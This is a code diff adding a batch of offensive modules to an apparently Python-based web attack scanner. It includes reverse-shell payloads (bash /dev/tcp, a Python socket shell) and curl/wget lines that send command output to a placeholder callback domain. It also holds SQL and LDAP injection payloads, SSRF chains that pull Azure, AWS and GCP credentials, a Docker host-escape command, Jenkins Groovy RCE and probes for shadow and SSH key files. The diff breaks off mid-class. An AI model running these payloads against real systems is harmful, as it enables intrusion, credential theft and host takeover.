@@ -7964,6 +7964,1745 @@ class BusinessLogicAdvanced:
         return profile
 
 # ══════════════════════════════════════════════════════════════
+# TOOLS 161-210 — 50 Black Team Skills (Phase 12)
+# ══════════════════════════════════════════════════════════════
+
+class RCEVerificationChain:
+    """Generate OOB DNS-callback RCE verification payloads for confirmed injection points."""
+    NAME = "RCE Verification Chain"
+    OOB_DOMAIN = "YOUR_OOB_DOMAIN.burpcollaborator.net"
+    SHELLS = [
+        ("bash",   "bash+-c+'bash+-i+>%26+/dev/tcp/{oob}/443+0>%261'"),
+        ("curl",   "curl+http://rce.{host}.{oob}/$(id)"),
+        ("wget",   "wget+http://rce.{host}.{oob}/$(whoami)"),
+        ("python", "python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect((\"{oob}\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
+        ("nslookup","nslookup+$(id).{host}.{oob}"),
+        ("ping",   "ping+-c+1+$(uname+-a|base64|tr+-d+\\'\\n\\').{oob}"),
+    ]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        oob = self.OOB_DOMAIN
+        host = profile.host
+        chains = []
+        for shell, tmpl in self.SHELLS:
+            payload = tmpl.format(oob=oob, host=host)
+            chains.append(f"  [{shell}] {payload}")
+        profile.findings.append(Finding(
+            id="RCE-VRF-001",
+            title="RCE Verification — OOB DNS Callback Payloads Generated",
+            severity="INFO",
+            cvss=0.0,
+            cwe="CWE-78",
+            description=(
+                f"Generated {len(self.SHELLS)} OOB DNS-callback RCE verification payloads for {host}. "
+                "Replace YOUR_OOB_DOMAIN with your Burp Collaborator / interactsh domain and inject "
+                "into any confirmed command injection, SSTI, or deserialization point to verify OOB execution."
+            ),
+            evidence="\n".join(chains),
+            poc_curl=(
+                f"# Inject into confirmed injection point:\n"
+                f"curl -sk 'https://{host}/api/cmd?cmd=curl+http://rce.{host}.{oob}/$(id)'"
+            ),
+            category="RCE",
+            remediation="Use interactsh (https://app.interactsh.com) or Burp Collaborator to detect DNS callbacks. Each shell variant targets a different interpreter; monitor all."
+        ))
+        return profile
+
+
+class ShellUploadPathDetector:
+    """Probe for webshell upload paths and common backdoor locations."""
+    NAME = "Shell Upload Path Detector"
+    SHELL_PATHS = [
+        "/uploads/shell.php", "/upload/cmd.php", "/files/shell.php",
+        "/assets/shell.php", "/images/shell.php", "/static/shell.php",
+        "/media/shell.php", "/tmp/shell.php", "/shell.php", "/cmd.php",
+        "/webshell.php", "/c99.php", "/r57.php", "/b374k.php",
+        "/uploads/shell.jsp", "/shell.jsp", "/cmd.aspx", "/shell.aspx",
+        "/uploads/shell.asp", "/.htaccess.bak", "/web.config.bak",
+        "/config.php.bak", "/index.php~", "/config.bak",
+        "/backup.zip", "/backup.tar.gz", "/site.zip", "/www.zip",
+        "/.bash_history", "/.ssh/id_rsa", "/proc/self/environ",
+        "/etc/passwd", "/etc/shadow", "/windows/win.ini",
+        "/windows/system32/drivers/etc/hosts",
+    ]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        found = []
+        for path in self.SHELL_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 206):
+                    body = (r.body or b"")[:200].decode("utf-8", errors="replace")
+                    if any(sig in body.lower() for sig in [
+                        "root:", "bin/bash", "eval(", "system(", "exec(",
+                        "passthru", "<?php", "<%@", "shell_exec",
+                        "uid=", "gid=", "[fonts]", "[extensions]"
+                    ]):
+                        found.append((path, r.status, body[:80]))
+            except Exception:
+                pass
+        if found:
+            for path, code, snippet in found:
+                profile.findings.append(Finding(
+                    id=f"SHELL-UPLOAD-{path.replace('/','_').strip('_')[:20].upper()}",
+                    title=f"Backdoor/Sensitive file accessible: {path}",
+                    severity="CRITICAL",
+                    cvss=9.8,
+                    cwe="CWE-434",
+                    description=f"Path {path} returned HTTP {code} with sensitive content indicators.",
+                    evidence=f"HTTP {code} | snippet: {snippet}",
+                    poc_curl=f"curl -sk '{base}{path}'",
+                    category="Webshell/Backdoor",
+                    remediation="Remove backdoor files immediately, audit upload directory permissions, restrict execute permissions on upload folders, add server-side MIME type validation."
+                ))
+        return profile
+
+
+class TimingBasedSQLiExtractor:
+    """Detect blind time-based SQLi via response time differential across payloads."""
+    NAME = "Timing-Based SQLi Extractor"
+    PAYLOADS = [
+        ("MySQL-sleep",    "' AND SLEEP(4)-- -",              4.0),
+        ("MySQL-benchmark","' AND BENCHMARK(10000000,MD5(1))-- -", 3.0),
+        ("MSSQL-waitfor",  "'; WAITFOR DELAY '0:0:4'-- -",    4.0),
+        ("PostgreSQL-pg",  "'; SELECT pg_sleep(4);--",         4.0),
+        ("Oracle-ctxsys",  "' AND 1=(SELECT 1 FROM dual WHERE ROWNUM=1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(0),4)=1)-- -", 4.0),
+        ("SQLite-sleep",   "' AND (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(150000000)))) ELSE 0 END)-- -", 3.5),
+    ]
+    PARAMS = ["id", "user", "search", "q", "query", "name", "email", "page",
+              "cat", "category", "product", "item", "order", "sort", "filter"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for param in self.PARAMS:
+            # baseline timing
+            baseline_url = f"{base}/?{param}=1"
+            try:
+                t0 = time.time()
+                _fetch(baseline_url, cfg.ua, 8)
+                baseline = time.time() - t0
+            except Exception:
+                baseline = 1.0
+            for db, payload, expected_delay in self.PAYLOADS:
+                import urllib.parse
+                enc = urllib.parse.quote(payload)
+                url = f"{base}/?{param}={enc}"
+                try:
+                    t0 = time.time()
+                    _fetch(url, cfg.ua, int(expected_delay) + 6)
+                    elapsed = time.time() - t0
+                    delta = elapsed - baseline
+                    if delta >= expected_delay * 0.7:
+                        profile.findings.append(Finding(
+                            id=f"SQLI-TIMING-{db.upper()[:12]}-{param.upper()[:8]}",
+                            title=f"Blind Time-Based SQLi — {db} via ?{param}",
+                            severity="CRITICAL",
+                            cvss=9.8,
+                            cwe="CWE-89",
+                            description=(
+                                f"Parameter '{param}' caused {delta:.1f}s delay (baseline {baseline:.2f}s) "
+                                f"with {db} payload. Indicates blind SQL injection."
+                            ),
+                            evidence=f"Baseline: {baseline:.2f}s | Injected: {elapsed:.2f}s | Delta: {delta:.2f}s",
+                            poc_curl=f"curl -sk '{url}'",
+                            category="SQL Injection",
+                            remediation="Use parameterised queries / prepared statements. Never interpolate user input into SQL strings."
+                        ))
+                        break
+                except Exception:
+                    pass
+        return profile
+
+
+class LDAPPrivescChain:
+    """Detect LDAP injection → group enumeration → privilege escalation path analysis."""
+    NAME = "LDAP Privesc Chain"
+    LDAP_PAYLOADS = [
+        ("always-true",  "*)(uid=*))(|(uid=*",    "admin"),
+        ("wildcard",     "*",                       "user"),
+        ("bypass",       "admin)(&(password=*",    "login"),
+        ("enum-cn",      "*))(cn=*",               "search"),
+        ("dump-all",     "*))%00",                 "filter"),
+        ("inject-or",    "x)(|(cn=admin)(cn=*",    "group"),
+    ]
+    LDAP_PARAMS = ["username", "user", "uid", "cn", "filter", "search",
+                   "query", "login", "email", "dn", "group", "role"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for param in self.LDAP_PARAMS:
+            for label, payload, context in self.LDAP_PAYLOADS:
+                import urllib.parse
+                url = f"{base}/api/{context}?{param}={urllib.parse.quote(payload)}"
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
+                               f"{param}={urllib.parse.quote(payload)}".encode(),
+                               {"Content-Type": "application/x-www-form-urlencoded"})
+                    if r and r.status in (200, 201):
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if any(sig in body.lower() for sig in [
+                            "admin", "cn=", "dc=", "ou=", "dn:", "objectclass",
+                            "uid=", "member", "groupofnames", "distinguished"
+                        ]):
+                            profile.findings.append(Finding(
+                                id=f"LDAP-INJECT-{label.upper()[:12]}-{param.upper()[:8]}",
+                                title=f"LDAP Injection → Privesc Path — {label} via {param}",
+                                severity="CRITICAL",
+                                cvss=9.1,
+                                cwe="CWE-90",
+                                description=(
+                                    f"LDAP payload '{payload}' in parameter '{param}' ({context}) "
+                                    f"returned LDAP directory content. Full directory enumeration and "
+                                    f"privilege escalation possible via DN manipulation."
+                                ),
+                                evidence=body[:200],
+                                poc_curl=(
+                                    f"curl -sk -X POST {base}/api/{context} "
+                                    f"-d '{param}={urllib.parse.quote(payload)}'"
+                                ),
+                                category="LDAP Injection",
+                                remediation="Use LDAP parameterised queries; escape all special chars: *, (, ), \\, NUL. Apply allowlist validation on LDAP filter inputs."
+                            ))
+                            break
+                except Exception:
+                    pass
+        return profile
+
+
+class NTLMHashLeakDetect:
+    """Detect NTLM authentication challenge exposure in HTTP response headers."""
+    NAME = "NTLM Hash Leak Detector"
+    NTLM_PATHS = ["/", "/owa/", "/autodiscover/", "/ecp/", "/mapi/",
+                  "/rpc/", "/EWS/", "/exchange/", "/api/", "/admin/",
+                  "/wp-admin/", "/webmail/", "/mail/", "/login"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.NTLM_PATHS:
+            url = base + path
+            for headers in [
+                {"Authorization": "NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA="},
+                {"Authorization": "Negotiate TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA="},
+            ]:
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout, extra_headers=headers)
+                    if r:
+                        www_auth = (r.headers.get("www-authenticate","") or
+                                    r.headers.get("WWW-Authenticate",""))
+                        if "ntlm" in www_auth.lower() or "negotiate" in www_auth.lower():
+                            profile.findings.append(Finding(
+                                id=f"NTLM-LEAK-{path.replace('/','_').strip('_')[:16].upper()}",
+                                title=f"NTLM Authentication Exposure at {path}",
+                                severity="HIGH",
+                                cvss=7.5,
+                                cwe="CWE-287",
+                                description=(
+                                    f"NTLM/Negotiate authentication challenge detected at {url}. "
+                                    "Enables NetNTLM hash capture via Responder when combined with "
+                                    "SSRF or XXE — captures admin credentials for offline cracking."
+                                ),
+                                evidence=f"WWW-Authenticate: {www_auth[:120]}",
+                                poc_curl=(
+                                    f"curl -sk -H 'Authorization: NTLM TlRMTVNTUAABAAAAB4IIAA==' "
+                                    f"'{url}' -v 2>&1 | grep -i 'www-authenticate'"
+                                ),
+                                category="NTLM",
+                                remediation="Disable NTLM authentication on public-facing endpoints. Enforce Kerberos or OAuth2 for SSO. Block NTLM at the WAF layer."
+                            ))
+                            break
+                except Exception:
+                    pass
+        return profile
+
+
+class AzureIMDSChain:
+    """Generate SSRF → Azure IMDS v1/v2 → managed identity token exploit chain."""
+    NAME = "Azure IMDS Chain"
+    IMDS_PATHS = [
+        ("v1-metadata",    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                           {"Metadata": "true"}),
+        ("v1-identity",    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+                           {"Metadata": "true"}),
+        ("v1-subscription","http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text",
+                           {"Metadata": "true"}),
+        ("v2-identity",    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-11-01&resource=https://vault.azure.net",
+                           {"Metadata": "true"}),
+    ]
+    SSRF_PARAMS = ["url", "fetch", "proxy", "redirect", "resource", "endpoint",
+                   "target", "dest", "link", "src", "image", "load", "callback"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import urllib.parse
+        base = profile.url.rstrip("/")
+        for variant, imds_url, req_headers in self.IMDS_PATHS:
+            enc = urllib.parse.quote(imds_url)
+            for param in self.SSRF_PARAMS:
+                ssrf_url = f"{base}?{param}={enc}"
+                payload_burp = (
+                    f"GET /?{param}={enc} HTTP/1.1\r\n"
+                    f"Host: {profile.host}\r\n"
+                    f"Metadata: true\r\n\r\n"
+                )
+                profile.findings.append(Finding(
+                    id=f"AZURE-IMDS-{variant.upper()[:14]}-{param.upper()[:6]}",
+                    title=f"SSRF → Azure IMDS {variant} Chain via ?{param}",
+                    severity="CRITICAL",
+                    cvss=9.9,
+                    cwe="CWE-918",
+                    description=(
+                        f"If SSRF confirmed via ?{param}, inject Azure IMDS endpoint "
+                        f"({variant}) to retrieve managed identity access token granting "
+                        f"full Azure control plane access (subscription, Key Vault, Storage)."
+                    ),
+                    evidence=(
+                        f"SSRF URL: {ssrf_url}\n"
+                        f"IMDS Target: {imds_url}\n"
+                        f"Expected response: {{\"access_token\": \"eyJ0eXAiOiJKV1QiLCJhbGci...\"}}"
+                    ),
+                    poc_curl=(
+                        f"# Step 1 — Verify SSRF via OOB:\n"
+                        f"curl -sk '{base}?{param}=http://YOUR_OOB_DOMAIN.burpcollaborator.net/'\n"
+                        f"# Step 2 — Exploit via Azure IMDS:\n"
+                        f"curl -sk '{ssrf_url}' -H 'Metadata: true'"
+                    ),
+                    category="SSRF → Cloud Pivot",
+                    remediation="Block IMDS at network layer (SSRF egress filtering). Use IMDSv2 with PUT token. Apply outbound firewall rules blocking 169.254.169.254."
+                ))
+                break  # one param per IMDS variant is sufficient for the PoC
+        return profile
+
+
+class AWSIMDSChain:
+    """Generate SSRF → AWS IMDSv1/v2 → IAM credential exfiltration chain."""
+    NAME = "AWS IMDS Chain"
+    IMDS_PATHS = [
+        ("v1-creds",    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+        ("v1-role",     "http://169.254.169.254/latest/meta-data/iam/info"),
+        ("v2-token",    "http://169.254.169.254/latest/api/token"),
+        ("v1-userdata", "http://169.254.169.254/latest/user-data"),
+        ("v1-hostname", "http://169.254.169.254/latest/meta-data/hostname"),
+        ("v1-account",  "http://169.254.169.254/latest/dynamic/instance-identity/document"),
+    ]
+    SSRF_PARAMS = ["url", "fetch", "proxy", "redirect", "resource", "endpoint",
+                   "target", "dest", "callback", "webhook", "load", "src"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import urllib.parse
+        base = profile.url.rstrip("/")
+        for variant, imds_url in self.IMDS_PATHS[:3]:
+            enc = urllib.parse.quote(imds_url)
+            param = self.SSRF_PARAMS[0]
+            profile.findings.append(Finding(
+                id=f"AWS-IMDS-{variant.upper()[:14]}",
+                title=f"SSRF → AWS IMDS {variant} — IAM Credential Theft Chain",
+                severity="CRITICAL",
+                cvss=9.9,
+                cwe="CWE-918",
+                description=(
+                    f"If SSRF confirmed, inject AWS IMDS endpoint ({variant}) to retrieve "
+                    "IAM role credentials (AccessKeyId, SecretAccessKey, Token) granting "
+                    "full AWS API access. Combine with IMDSv2 X-aws-ec2-metadata-token bypass."
+                ),
+                evidence=(
+                    f"Target: {imds_url}\n"
+                    f"Step 1 — Get role name: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
+                    f"Step 2 — Get creds: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n"
+                    f"Step 3 — Use creds: aws sts get-caller-identity --profile stolen"
+                ),
+                poc_curl=(
+                    f"# IMDSv1 (no token required):\n"
+                    f"curl -sk '{base}?{param}={enc}'\n"
+                    f"# IMDSv2 bypass (PUT token first):\n"
+                    f"TOKEN=$(curl -sk -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "
+                    f"'http://169.254.169.254/latest/api/token') && "
+                    f"curl -sk -H \"X-aws-ec2-metadata-token: $TOKEN\" "
+                    f"'http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
+                ),
+                category="SSRF → Cloud Pivot",
+                remediation="Block 169.254.169.254 in egress firewall rules. Enforce IMDSv2 (require token). Apply least-privilege IAM roles. Use VPC endpoint policies."
+            ))
+        return profile
+
+
+class GCPMetadataChain:
+    """Generate SSRF → GCP metadata API → service account token chain."""
+    NAME = "GCP Metadata Chain"
+    GCP_PATHS = [
+        ("sa-token",   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                       {"Metadata-Flavor": "Google"}),
+        ("sa-email",   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
+                       {"Metadata-Flavor": "Google"}),
+        ("project-id", "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+                       {"Metadata-Flavor": "Google"}),
+        ("ssh-keys",   "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
+                       {"Metadata-Flavor": "Google"}),
+        ("alt-ip",     "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+                       {"Metadata-Flavor": "Google"}),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import urllib.parse
+        base = profile.url.rstrip("/")
+        for variant, gcp_url, req_headers in self.GCP_PATHS[:3]:
+            enc = urllib.parse.quote(gcp_url)
+            profile.findings.append(Finding(
+                id=f"GCP-META-{variant.upper()[:14]}",
+                title=f"SSRF → GCP Metadata {variant} — Service Account Token Chain",
+                severity="CRITICAL",
+                cvss=9.9,
+                cwe="CWE-918",
+                description=(
+                    f"If SSRF confirmed, inject GCP metadata endpoint ({variant}) to retrieve "
+                    "OAuth2 access_token for the instance service account. Token grants GCP API "
+                    "access to Cloud Storage, GKE, BigQuery, etc."
+                ),
+                evidence=(
+                    f"Metadata Target: {gcp_url}\n"
+                    f"Required header: Metadata-Flavor: Google\n"
+                    f"Expected: {{\"access_token\": \"ya29.xxx\", \"token_type\": \"Bearer\"}}"
+                ),
+                poc_curl=(
+                    f"curl -sk '{base}?url={enc}' -H 'Metadata-Flavor: Google'\n"
+                    f"# Or direct if host has SSRF:\n"
+                    f"curl -sk '{gcp_url}' -H 'Metadata-Flavor: Google'"
+                ),
+                category="SSRF → Cloud Pivot",
+                remediation="Block metadata.google.internal and 169.254.169.254 in egress. Use Workload Identity Federation instead of service account keys. Apply metadata server access controls."
+            ))
+        return profile
+
+
+class K8sAPIDetector:
+    """Detect exposed Kubernetes API server and RBAC misconfigurations."""
+    NAME = "K8s API Server Detector"
+    K8S_PATHS = [
+        "/api/v1/namespaces",
+        "/api/v1/pods",
+        "/api/v1/secrets",
+        "/api/v1/configmaps",
+        "/api/v1/serviceaccounts",
+        "/api/v1/nodes",
+        "/apis/apps/v1/deployments",
+        "/apis/rbac.authorization.k8s.io/v1/clusterroles",
+        "/version",
+        "/healthz",
+        "/metrics",
+        "/openapi/v2",
+    ]
+    K8S_PORTS = [6443, 8443, 8080, 10250, 10255, 2379]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.K8S_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 201, 403):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        '"apiVersion"', '"kind"', '"items"', '"metadata"',
+                        '"namespace"', 'kubernetes', '"clusterName"',
+                        '"gitVersion"', "Unauthorized", "Forbidden"
+                    ]):
+                        sev = "CRITICAL" if r.status == 200 else "HIGH"
+                        cvss = 10.0 if r.status == 200 else 7.5
+                        profile.findings.append(Finding(
+                            id=f"K8S-API-{path.replace('/','_').strip('_')[:20].upper()}",
+                            title=f"Kubernetes API Exposed: {path} (HTTP {r.status})",
+                            severity=sev,
+                            cvss=cvss,
+                            cwe="CWE-284",
+                            description=(
+                                f"Kubernetes API endpoint {path} returned HTTP {r.status} "
+                                "indicating an exposed or misconfigured K8s cluster. "
+                                "Unauthenticated access allows cluster compromise: secret exfil, "
+                                "pod exec, lateral movement to cloud IAM."
+                            ),
+                            evidence=body[:300],
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# Enumerate secrets:\n"
+                                f"kubectl --server=https://{profile.host} --insecure-skip-tls-verify "
+                                f"get secrets --all-namespaces 2>/dev/null"
+                            ),
+                            category="K8s / Container",
+                            remediation="Bind K8s API server to internal IPs only. Enable RBAC. Disable anonymous authentication (--anonymous-auth=false). Rotate all secrets."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class DockerAPIDaemonExposed:
+    """Detect exposed Docker daemon API (TCP 2375/2376) via HTTP probe."""
+    NAME = "Docker API Daemon Exposed"
+    DOCKER_PATHS = [
+        "/v1.41/info", "/v1.41/version", "/v1.41/containers/json",
+        "/v1.41/images/json", "/v1.41/volumes", "/v1.41/networks",
+        "/v1.41/secrets", "/v1.41/_ping",
+        "/info", "/version", "/containers/json",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.DOCKER_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        '"DockerRootDir"', '"ServerVersion"', '"Containers"',
+                        '"Images"', '"KernelVersion"', "DOCKER_", '"Id"',
+                        '"Architecture"', '"OSType"', "docker"
+                    ]):
+                        profile.findings.append(Finding(
+                            id=f"DOCKER-API-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"Docker Daemon API Exposed: {path}",
+                            severity="CRITICAL",
+                            cvss=10.0,
+                            cwe="CWE-284",
+                            description=(
+                                f"Docker API endpoint {path} is publicly accessible without authentication. "
+                                "Full container control: create privileged containers, mount host filesystem, "
+                                "escape to root on host OS via --privileged or --volume /:/mnt/host."
+                            ),
+                            evidence=body[:300],
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# Escape to host root:\n"
+                                f"curl -sk -X POST '{base}/v1.41/containers/create' "
+                                f"-H 'Content-Type: application/json' "
+                                f"-d '{{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"HostConfig\":{{\"Binds\":[\"/:/mnt/host\"],\"Privileged\":true}}}}'"
+                            ),
+                            category="K8s / Container",
+                            remediation="Bind Docker daemon to Unix socket only (never TCP without mTLS). Add --host=unix:///var/run/docker.sock. Block port 2375/2376 at firewall."
+                        ))
+                        break
+            except Exception:
+                pass
+        return profile
+
+
+class JenkinsRCEDetector:
+    """Detect Jenkins script console, Groovy RCE surface, and unauthenticated endpoints."""
+    NAME = "Jenkins RCE Detector"
+    JENKINS_PATHS = [
+        ("/script",           "Script Console — Direct Groovy RCE"),
+        ("/scriptText",       "Script Console POST endpoint — Direct Groovy RCE"),
+        ("/manage",           "Management Interface Exposed"),
+        ("/computer/",        "Agent/Node List Exposed"),
+        ("/asynchPeople/",    "User Enumeration via asynchPeople"),
+        ("/api/json",         "Jenkins REST API Unauthenticated"),
+        ("/api/xml",          "Jenkins XML API Unauthenticated"),
+        ("/credentials/",     "Credentials Store Exposed"),
+        ("/configure",        "Global Configuration Exposed"),
+        ("/job/",             "Job List Exposed"),
+        ("/view/all/",        "All Jobs View Exposed"),
+        ("/pluginManager/",   "Plugin Manager Exposed — install arbitrary plugins"),
+        ("/securityRealm/",   "Security Realm Configuration"),
+        ("/me/api/json",      "Current User API"),
+        ("/whoAmI/api/json",  "Anonymous User Identity Check"),
+        ("/queue/api/json",   "Build Queue Exposed"),
+        ("/overallLoad/api/json", "System Load Metrics"),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path, desc in self.JENKINS_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 405):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        "Jenkins", "hudson", "Groovy", "groovy",
+                        "Script Console", "Manage Jenkins", "Build History",
+                        "crumb", "Jenkins-Crumb", "j_username", "j_password",
+                        '"_class"', "hudson.model"
+                    ]):
+                        sev = "CRITICAL" if "script" in path.lower() or "credentials" in path.lower() else "HIGH"
+                        profile.findings.append(Finding(
+                            id=f"JENKINS-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"Jenkins {desc}",
+                            severity=sev,
+                            cvss=9.8 if sev == "CRITICAL" else 7.5,
+                            cwe="CWE-284",
+                            description=(
+                                f"Jenkins endpoint {path} is accessible (HTTP {r.status}). "
+                                f"{desc}. "
+                                "Jenkins script console provides direct Groovy code execution "
+                                "on the server — equivalent to OS-level RCE."
+                            ),
+                            evidence=body[:200],
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# Groovy RCE via script console:\n"
+                                f"curl -sk -X POST '{base}/scriptText' "
+                                f"-d 'script=println+\"id\".execute().text'"
+                            ),
+                            category="Jenkins / CI-CD",
+                            remediation="Restrict Jenkins to internal network. Enable authentication (Matrix-based security). Disable CLI remoting. Apply CSRF protection. Run Jenkins behind reverse proxy with auth."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+
+class GitLabTokenScanner:
+    """Scan for exposed GitLab tokens, CI/CD variables, and repository secrets."""
+    NAME = "GitLab Token Scanner"
+    GITLAB_PATHS = [
+        "/.gitlab-ci.yml", "/gitlab-ci.yml", "/.env.gitlab",
+        "/api/v4/projects", "/api/v4/users", "/api/v4/groups",
+        "/api/v4/admin/users", "/-/graphql",
+        "/users/sign_in", "/-/profile/personal_access_tokens",
+        "/admin/users", "/admin/application_settings",
+        "/explore/projects", "/explore/groups",
+        "/.git/config", "/.git/HEAD",
+    ]
+    GITLAB_TOKEN_PATTERNS = [
+        r'glpat-[A-Za-z0-9\-_]{20}',
+        r'glptt-[A-Za-z0-9]{40}',
+        r'GR1348941[A-Za-z0-9\-_]{20}',
+        r'"private_token"\s*:\s*"[A-Za-z0-9\-_]{20}"',
+        r'GITLAB_TOKEN["\s]*[:=]["\s]*([A-Za-z0-9\-_]{20,})',
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import re
+        base = profile.url.rstrip("/")
+        for path in self.GITLAB_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    for pat in self.GITLAB_TOKEN_PATTERNS:
+                        m = re.search(pat, body)
+                        if m:
+                            profile.findings.append(Finding(
+                                id=f"GITLAB-TOKEN-{path.replace('/','_').strip('_')[:16].upper()}",
+                                title=f"GitLab Token/Secret Exposed at {path}",
+                                severity="CRITICAL",
+                                cvss=9.8,
+                                cwe="CWE-798",
+                                description=(
+                                    f"GitLab personal access token or CI/CD secret found at {path}. "
+                                    "Token grants full API access: repo read/write, user impersonation, "
+                                    "runner registration, deployment pipeline control."
+                                ),
+                                evidence=f"Match: {m.group(0)[:60]}",
+                                poc_curl=(
+                                    f"curl -sk '{url}'\n"
+                                    f"# Verify token access:\n"
+                                    f"curl -sk --header 'PRIVATE-TOKEN: <token>' "
+                                    f"'{base}/api/v4/projects'"
+                                ),
+                                category="Secrets / Tokens",
+                                remediation="Revoke token immediately via GitLab UI. Rotate all secrets in CI/CD variables. Enable secret detection in GitLab (Settings > Security). Use SAST scanning."
+                            ))
+                            break
+                    if any(sig in body for sig in ['"id"', '"username"', '"name_with_namespace"']):
+                        if "/api/v4" in path:
+                            profile.findings.append(Finding(
+                                id=f"GITLAB-API-ANON-{path.replace('/','_').strip('_')[:14].upper()}",
+                                title=f"GitLab API Unauthenticated Access: {path}",
+                                severity="HIGH",
+                                cvss=7.5,
+                                cwe="CWE-284",
+                                description=f"GitLab API endpoint {path} returns data without authentication.",
+                                evidence=body[:200],
+                                poc_curl=f"curl -sk '{url}'",
+                                category="GitLab / Source Control",
+                                remediation="Set GitLab visibility to Private. Restrict API to authenticated users. Disable public project access."
+                            ))
+            except Exception:
+                pass
+        return profile
+
+
+class SupplyChainAttackSurface:
+    """Detect dependency confusion / namespace confusion attack surface."""
+    NAME = "Supply Chain Attack Surface"
+    MANIFEST_PATHS = [
+        "/package.json", "/package-lock.json", "/yarn.lock",
+        "/requirements.txt", "/Pipfile", "/Pipfile.lock",
+        "/setup.py", "/setup.cfg", "/pyproject.toml",
+        "/pom.xml", "/build.gradle", "/build.gradle.kts",
+        "/go.mod", "/go.sum", "/Cargo.toml", "/Cargo.lock",
+        "/composer.json", "/composer.lock", "/Gemfile", "/Gemfile.lock",
+        "/.npmrc", "/.pypirc", "/nuget.config", "/.rubygems.config",
+        "/webpack.config.js", "/rollup.config.js", "/vite.config.js",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import re
+        base = profile.url.rstrip("/")
+        internal_pkg_pattern = re.compile(
+            r'"name"\s*:\s*"(@[a-z0-9-]+/[a-z0-9-]+|[a-z0-9-]+-internal|[a-z0-9-]+-private|[a-z0-9-]+-corp)"'
+        )
+        for path in self.MANIFEST_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    pkgs = internal_pkg_pattern.findall(body)
+                    profile.findings.append(Finding(
+                        id=f"SUPPLY-CHAIN-{path.replace('/','_').strip('_')[:16].upper()}",
+                        title=f"Dependency Manifest Exposed: {path}",
+                        severity="MEDIUM" if not pkgs else "HIGH",
+                        cvss=5.3 if not pkgs else 7.8,
+                        cwe="CWE-829",
+                        description=(
+                            f"Dependency manifest {path} is publicly accessible. "
+                            + (f"Internal package names detected: {', '.join(pkgs[:5])} — "
+                               "dependency confusion attack possible by publishing same names to public registries."
+                               if pkgs else
+                               "Package list exposed — allows targeted supply chain attack via typosquatting.")
+                        ),
+                        evidence=body[:300],
